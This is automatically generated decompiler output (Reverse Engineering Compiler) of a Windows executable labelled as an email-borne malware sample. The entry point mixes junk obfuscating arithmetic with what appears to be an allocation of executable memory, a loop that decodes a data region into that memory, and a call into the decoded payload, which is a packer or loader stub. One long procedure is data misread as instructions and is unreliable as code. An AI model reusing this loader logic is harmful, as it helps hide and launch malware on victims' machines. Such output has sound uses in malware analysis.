/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1206/ia32_pe/subject.exe'
 */

stack space not deallocated on return
/*	Procedure: 0x004012AB - 0x004012F3
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004012AB()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    esp = esp - 1000;
    ecx = ecx + 4334;
    edx = ebp;
    ecx = ecx ^ *(edx + 15);
    eax = eax + *(edx + 8);
    eax = ebp + -940;
    *(ebp + -284) = *(ebp + -284) ^ 59;
    edx = edx & 1884;
    if(*(ebp + -764) != ecx) {
        ecx = ecx + 8194;
        edx = edx + ecx;
    }
    edx = ebp;
    eax = eax & *(edx + 5);
    ecx = ecx + *(edx + 10);
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x004012F4 - 0x004012F7
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004012F4()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x004012F8 - 0x0040169E
 *	Argument size: -608
 *	Local size: 608
 *	Save regs size: 0
 */

__entry_point__()
{
	/* unknown */ void  Vfffffdb8;
	/* unknown */ void  Vfffffdcc;
	/* unknown */ void  Vfffffdd0;
	/* unknown */ void  Vfffffddc;
	/* unknown */ void  Vfffffdec;
	/* unknown */ void  Vfffffe20;
	/* unknown */ void  Vfffffe34;
	/* unknown */ void  Vfffffe50;
	/* unknown */ void  Vfffffe54;
	/* unknown */ void  Vfffffe80;
	/* unknown */ void  Vfffffe84;
	/* unknown */ void  Vfffffe94;
	/* unknown */ void  Vfffffeac;
	/* unknown */ void  Vfffffeb0;
	/* unknown */ void  Vfffffebc;
	/* unknown */ void  Vfffffec4;
	/* unknown */ void  Vfffffec8;
	/* unknown */ void  Vfffffee4;
	/* unknown */ void  Vfffffee8;
	/* unknown */ void  Vffffff1c;
	/* unknown */ void  Vffffff28;
	/* unknown */ void  Vffffff30;
	/* unknown */ void  Vffffff34;
	/* unknown */ void  Vffffff3c;
	/* unknown */ void  Vffffff40;
	/* unknown */ void  Vffffff44;
	/* unknown */ void  Vffffff48;
	/* unknown */ void  Vffffff4c;
	/* unknown */ void  Vffffff5c;
	/* unknown */ void  Vffffff64;
	/* unknown */ void  Vffffff68;
	/* unknown */ void  Vffffff6c;
	/* unknown */ void  Vffffff74;
	/* unknown */ void  Vffffff78;
	/* unknown */ void  Vffffff8c;
	/* unknown */ void  Vffffff9c;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffb8;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff8;



    eax = *L00401080();
    Vfffffff8 = Vfffffff8 + 29;
    if(eax != 1019) {
        edx = edx - eax;
        Vffffffc4 = Vffffffc4 ^ 37;
        ecx = & Vffffff74;
        eax = eax + *ecx;
        edx = edx + *(ecx + 13) + *(ecx + 7);
        Vffffffec = Vffffffec + 26;
        Vfffffeac = Vfffffeac & 182;
    }
    (save)ebp;
    *esp = *esp - 148;
    *L00401118();
    edx = edx ^ Vffffffdc;
    ecx = ecx - 8044;
    (save) & Vffffff48;
    (save)0;
    esp = esp - 4;
    *esp = 0;
    *L00401094();
    Vfffffdb8 = Vfffffdb8 | 201;
    edx = edx | 16352;
    (save)0;
    *L00401110();
    eax = *L00401074();
    if(eax == 621) {
        Vfffffdb8 = Vfffffdb8 ^ 224;
        asm("adc edx,ecx");
        edx = ebp;
        ecx = ecx ^ *(edx + 9);
        eax = eax - *(edx + 15);
    }
    (save)2;
    if(ecx != 0) {
        Vffffffb4 = Vffffffb4 & ecx;
        edx = edx & Vfffffdcc;
        Vffffff64 = Vffffff64 - (ecx & 13324);
    }
    eax = *L00401030() + Vffffff64;
    (restore)ecx;
    asm("adc ecx,eax");
    (save)ebp;
    *esp = *esp - 176;
    *L004010b0();
    (save) & Vffffff1c;
    *L00401118();
    *L00401060();
    (save) & Vffffff5c;
    edx = edx + ecx;
    Vfffffe34 = Vfffffe34 - 84;
    (save) & Vffffff68;
    esp = esp - 4;
    *esp = 0;
    (save) *L00401118() & 8;
    ecx = ecx & 284;
    edx = ebp;
    eax = *L0040106c() - *(edx + 4);
    ecx = ecx - *(edx + 5);
    (save)eax;
    *L00401108();
    Vfffffee4 = Vfffffee4 - edx;
    edx = edx ^ 1553;
    eax = *L00401074() & 2788;
    Vffffff28 = Vffffff28 | 73;
    if(eax != ecx) {
        eax = eax - 3670;
        edx = edx | ecx;
        Vffffffdc = Vffffffdc & 128;
        Vffffff4c = Vffffff4c + (ecx | Vfffffec4);
        eax = eax ^ *(ebp + 5);
    }
    (save)ebp;
    *esp = *esp - 92;
    (save)0;
    eax = *L004010f8() | Vfffffe84;
    if(eax != edx) {
        Vffffffd8 = Vffffffd8 | 254;
        eax = & Vfffffddc;
        edx = (edx ^ *(eax + 3) ^ *(eax + 12)) & *(eax + 1);
    }
    (save)0;
    edx = edx ^ 8653;
    if(eax != edx) {
        asm("adc edx,edx");
        ecx = ecx + Vfffffee4;
        Vffffffc8 = Vffffffc8 & edx;
        Vffffff6c = Vffffff6c | edx;
        eax = eax - 13345;
    }
    (save)0;
    asm("adc eax,edx");
    Vfffffebc = Vfffffebc & 231;
    if(eax == 816) {
        edx = edx ^ 7664;
    }
    (save)0;
    eax = *L00401184() ^ -2147024809;
    if(!(ecx = ecx - 10543)) {
        eax = eax + edx;
        if(eax == 0) {
            Vfffffe54 = Vfffffe54 & 100;
            edx = edx + ecx;
            edx = ebp;
            edx = & Vffffff3c;
            eax = eax - *(edx + 16);
            ecx = (ecx & *(edx + 11)) - *(edx + 5);
        }
        asm("pusha");
        edx = edx - eax;
        edx = ebp;
        ecx = ecx & 12087;
        asm("sbb edx,eax");
        eax = ebp;
        ecx = ecx + *(eax + 1);
        (save)64;
        Vffffff34 = Vffffff34 ^ 19;
        if(eax != ecx) {
            ecx = ebp;
            eax = eax ^ *(ecx + 15) | *(ecx + 5);
            edx = edx - *ecx;
            eax = eax + ecx;
            ecx = & Vfffffe20;
            eax = eax ^ *(ecx + 10);
            edx = edx & *(ecx + 4);
        }
        (save)4096;
        if(ecx != 0) {
            Vffffff34 = Vffffff34 | 122;
            eax = eax | 14078;
        }
        (save)8192;
        Vfffffee4 = Vfffffee4 & eax;
        (save)0;
        Vffffff44 = Vffffff44 - ecx;
        Vfffffdec = *L004010ac();
        edx = edx - Vfffffe94 + 5005;
        if(Vfffffeb0 == ecx) {
            Vffffff3c = Vffffff3c ^ 36;
            Vffffffbc = Vffffffbc & 204;
            Vffffff40 = Vffffff40 & 13;
            ecx = ecx + 7510 ^ 10339;
            edx = edx - 2676;
        }
        ecx = ecx - Vfffffe50;
        eax = ebp;
        edx = edx - *(eax + 15);
        ecx = ecx | *(eax + 15);
        edx = & Vfffffee8;
        eax = (eax ^ *(edx + 14)) + *(edx + 4);
        edi = 0x412e33;
        ecx = ecx + eax;
        esi = Vfffffdec;
        Vffffff30 = Vffffff30 - eax;
        edx = edx - 9125;
        Vffffff9c = -1552257321;
        ecx = ecx - 10435;
        if(ecx != 0) {
            ecx = ecx | 10435;
            Vffffff68 = Vffffff68 | 21;
        }
        do {
            ebx = *edi;
            ecx = ecx ^ Vffffffb8;
            ebx = ebx + Vffffff9c;
            Vffffff9c = Vffffff9c + 1648285686;
            ecx = ecx & edx;
            asm("sbb edx,eax");
            *esi = ebx;
            eax = eax | 8825;
            edi = edi + -80554824;
            ecx = ecx - Vffffff78;
            esi = esi + -1516838232;
            if(eax == 1007) {
                eax = eax | 14503;
                edx = & Vfffffe80 - ecx;
                eax = eax & 13669;
                Vfffffec8 = Vfffffec8 + eax;
            }
            edi = edi + 80554828;
            edx = edx + 15294;
            esi = esi + 1516838236;
            if(!(Vfffffdd0 & ecx)) {
                Vffffffc8 = Vffffffc8 + 228;
                Vffffff44 = Vffffff44 - ecx;
                eax = eax ^ 13549;
            }
        } while(edi != 0x413ebf);
        eax = Vfffffdec();
        if(eax == edx) {
            eax = eax & 12470;
            Vffffff8c = Vffffff8c & 188;
        }
    }
}

stack space not deallocated on return
/*	Procedure: 0x0040169F - 0x00401796
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040169F()
{



    asm("int3");
    (save)ebp;
    ebp = esp;
    esp = esp - 944;
    edx = ebp + -632;
    ecx = ecx ^ *edx;
    *(ebp + -728) = *(ebp + -728) - 189;
    *(ebp + -184) = *(ebp + -184) ^ 155;
    if(eax == edx) {
        eax = eax - 5304;
        *(ebp + -360) = *(ebp + -360) ^ 94;
        edx = edx | 6314;
        ecx = ebp + -300;
        edx = edx - *(ecx + 3);
    }
    *(ebp - 16) = *(ebp - 16) & 158;
    *(ebp + -340) = *(ebp + -340) - 83;
    *(ebp + -564) = *(ebp + -564) & 191;
    asm("adc eax,ecx");
    if(*(ebp + -712) == eax) {
        edx = edx & eax;
        *(ebp + -224) = *(ebp + -224) ^ edx;
        eax = ebp;
        edx = edx & ecx;
    }
    edx = ebp;
    ecx = ecx + *(edx + 5) ^ 13879;
    edx = edx ^ *(ebp + -928);
    if(!( *(ebp + -428) & ecx)) {
        eax = eax - edx;
        edx = edx + eax;
        eax = eax + 4314;
        edx = ebp;
        eax = eax + *(edx + 7) - *(edx + 11);
    }
    if(edx != 0) {
        *(ebp - 56) = *(ebp - 56) & 99;
        *(ebp + -444) = *(ebp + -444) ^ (ecx | 12338);
        ecx = ebp + -740;
        edx = edx + *(ecx + 1);
        asm("sbb edx,ecx");
        *(ebp + -276) = *(ebp + -276) - 106;
    }
    if(ecx == eax) {
        edx = edx & 13978;
        *(ebp + -516) = *(ebp + -516) - 154;
        *(ebp + -792) = *(ebp + -792) - 94;
        eax = ebp + -696;
        ecx = ecx | *(eax + 10);
    }
    ecx = ecx | 9069;
    ecx = ebp + -216;
    *(ebp + -400) = *(ebp + -400) & 161;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x00401797 - 0x004019C5
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401797()
{



    *eax = *eax + bh;
    asm("sbb [eax],al");
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *(eax + 26) = *(eax + 26) + al;
    asm("adc [eax],al");
    *(eax + 24) = *(eax + 24) + ah;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    al :: 27;
    *eax = *eax + al;
    *eax = *eax - dl;
    *eax = *eax + al;
    asm("cwde");
    asm("sbb [eax],al");
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    dh = dh + ch;
    asm("sbb al,0x0");
    *(eax + 16) = *(eax + 16) + ah;
    *eax = *eax + al;
    al = al + 25;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    (save)esi;
    asm("sbb eax,0x10cc0000");
    *eax = *eax + al;
    asm("sbb [ecx],bl");
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    if(!( *eax = *eax + al)) {
        *eax = *eax + al;
        asm("loopne 0x40180a");
        *eax = *eax + al;
        asm("pusha");
        asm("sbb [eax],eax");
        *eax = *eax + al;
        *eax = *eax + al;
        *eax = *eax + al;
        *eax = *eax + al;
        *(edi + ebx) = *(edi + ebx) + al;
        *eax = *eax + al;
        *ecx = *ecx - dl;
        *eax = *eax + al;
        *ecx = bl;
        *eax = *eax + al;
    }
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax & ah;
    *eax = *eax + al;
    (save)eax;
    asm("adc [eax],eax");
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    ah = ah + al;
    asm("sbb [eax],eax");
    dh = dh + dl;
    asm("sbb [eax],eax");
    ah = ah + ah;
    asm("sbb [eax],eax");
    dh = dh + dh;
    asm("sbb [eax],eax");
    *esi = *esi + cl;
    asm("sbb al,[eax]");
    *(edx + ebx) = *(edx + ebx) + ah;
    *eax = *eax + al;
    al = al ^ 26;
    *eax = *eax + al;
    edx = edx - 1;
    asm("sbb al,[eax]");
    *(eax + 26) = *(eax + 26) + ch;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *edx = ds;
    *eax = *eax + al;
    asm("xchg eax,esp");
    asm("sbb al,[eax]");
    *(eax + -1308622822) = *(eax + -1308622822) + ah;
    asm("sbb al,[eax]");
    al = al + al;
    asm("sbb al,[eax]");
    ah = ah + dl;
    asm("sbb al,[eax]");
    ah = ah + bl;
    asm("sbb al,[eax]");
    dl = dl + dh;
    asm("sbb al,[eax]");
    *eax = *eax + al;
    asm("sbb eax,[eax]");
    *eax = *eax + dl;
    asm("sbb eax,[eax]");
    *edx = *edx + bl;
    asm("sbb eax,[eax]");
    *edx = *edx + ch;
    asm("sbb eax,[eax]");
    *edx = *edx + dh;
    asm("sbb eax,[eax]");
    *eax = *eax + al;
    *eax = *eax + al;
    *(eax + 27) = *(eax + 27) + cl;
    *eax = *eax + al;
    (restore)edx;
    asm("sbb eax,[eax]");
    *(esi + 27) = *(esi + 27) + ah;
    if(!( *eax = *eax + al)) {
        *eax = *eax + al;
        *ebx & bl;
        *eax = *eax + al;
        asm("sbb eax,[eax]");
        *(esi + -1207959525) = *(esi + -1207959525) + ah;
        asm("sbb eax,[eax]");
        dh = dh + al;
        asm("sbb eax,[eax]");
        ah = ah + bl;
        asm("sbb eax,[eax]");
        dh = dh + ah;
    }
    asm("sbb eax,[eax]");
    dh = dh + dh;
    asm("sbb eax,[eax]");
    *(esp + ebx) = *(esp + ebx) + al;
    *eax = *eax + al;
    asm("adc [eax+eax],bl");
    *esi = *esi + bl;
    asm("sbb al,0x0");
    *(esp + ebx) = *(esp + ebx) + ch;
    *eax = *eax + al;
    al :: 28;
    *eax = *eax + al;
    esp = esp - 1;
    asm("sbb al,0x0");
    *(edx + 28) = *(edx + 28) + bl;
    *eax = *eax + al;
    asm("o16 sbb al,0x0");
    *(esi + 28) = *(esi + 28) + dh;
    *eax = *eax + al;
    *(eax + eax) = ds;
    *(edx + -1476394980) = *(edx + -1476394980) + bl;
    asm("sbb al,0x0");
    *(eax + -704643044) = *(eax + -704643044) + bh;
    asm("sbb al,0x0");
    *eax = *eax + al;
    *eax = *eax + al;
    ah = ah + bh;
    asm("sbb al,0x0");
    *esi = *esi + dl;
    asm("sbb eax,0x1d260000");
    *eax = *eax + al;
    eax = eax + 1;
    asm("sbb eax,0x0");
    *eax = *eax + al;
    asm("bound ebx,[0x1d7c0000]");
    *eax = *eax + al;
    ds = *L1DA20000;
    *eax = *eax + al;
    asm("scasb");
    asm("sbb eax,0x1dbc0000");
    *eax = *eax + al;
    asm("int3");
    asm("sbb eax,0x1ddc0000");
    *eax = *eax + al;
    goto L0000001d;
    *eax = *eax + dl;
    (save)ds;
    *eax = *eax + al;
    asm("sbb al,0x1e");
    *eax = *eax + al;
    *eax = *eax + al;
    bl = bl - *esi ^ *esi;
    *eax = *eax + al;
    eax = eax - 1;
    (save)ds;
    *eax = *eax + al;
    (save)esi;
    (save)ds;
    *eax = *eax + al;
    (save)30;
    *eax = *eax + al;
    *(esi + ebx + 513015808) = *(esi + ebx + 513015808) + al;
    *eax = *eax + al;
    al = *LAE00001E;
    (save)ds;
    *eax = *eax + al;
    esi = -905969634;
    (save)ds;
    *eax = *eax + al;
    asm("salc");
    (save)ds;
    *eax = *eax + al;
    goto L0000001e;
    *eax = *eax + al;
    *eax = *eax + al;
    *edx = *edx + dl;
    (restore)ds;
    *eax = *eax + al;
    asm("%e pop ds");
    *eax = *eax + al;
    asm("%s pop ds");
    *eax = *eax + al;
    eax = eax + 1;
    (restore)ds;
    *eax = *eax + al;
    ds = eax;
    *eax = *eax + al;
    asm("o16 pop ds");
    if(!( *eax = *eax + al)) {
        *eax = *eax + al;
        *edi = bl;
        *eax = *eax + al;
        eax = L0000001f();
        dh = dh + al;
        (restore)ds;
        *eax = *eax + al;
        asm("fcomp dword [edi]");
        *eax = *eax + al;
        asm("clc");
        (restore)ds;
        *eax = *eax + al;
        al = al | 32;
        *eax = *eax + al;
        *eax = *eax + al;
    }
    *eax = *eax + al;
}

/* address  size  */
/* 0x004012f8       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
